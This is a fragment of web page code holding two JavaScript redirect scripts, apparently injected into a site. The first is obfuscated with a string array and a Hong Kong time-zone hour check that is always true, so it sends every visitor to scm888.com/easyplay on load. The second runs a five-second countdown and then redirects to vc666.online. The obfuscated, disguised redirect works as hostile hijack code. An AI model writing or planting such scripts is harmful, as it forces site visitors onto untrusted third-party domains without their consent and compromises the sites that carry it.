
<script>
    var _0xe3b0 = ["en-US", "Asia/Hong_Kong", "toLocaleString", "getHours", "location", "https://www.scm888.com/easyplay"],
        d = new Date((new Date)[_0xe3b0[2]](_0xe3b0[0], {
            timeZone: _0xe3b0[1]
        })),
        hours = d[_0xe3b0[3]]();
    hours >= 0 && hours <= 23 && (window[_0xe3b0[4]] = _0xe3b0[5]);
</script>


------------------------------------------------------------------------------------------------------------------------------------/
------------------------------------------------------------------------------------------------------------------------------------/

<span id="totalSecond">5</span>
<script language="javascript" type="text/javascript">
    var second = document.getElementById('totalSecond').textContent;

    if (navigator.appName.indexOf("Explorer") > -1) {
        second = document.getElementById('totalSecond').innerText;
    } else {
        second = document.getElementById('totalSecond').textContent;
    }

    setInterval("redirect()", 1000);

    function redirect() {
        if (second < 0) {
            location.href = 'http://www.vc666.online/';
        } else {
            if (navigator.appName.indexOf("Explorer") > -1) {
                document.getElementById('totalSecond').innerText = second--;
            } else {
                document.getElementById('totalSecond').textContent = second--;
            }
        }
    }
</script>






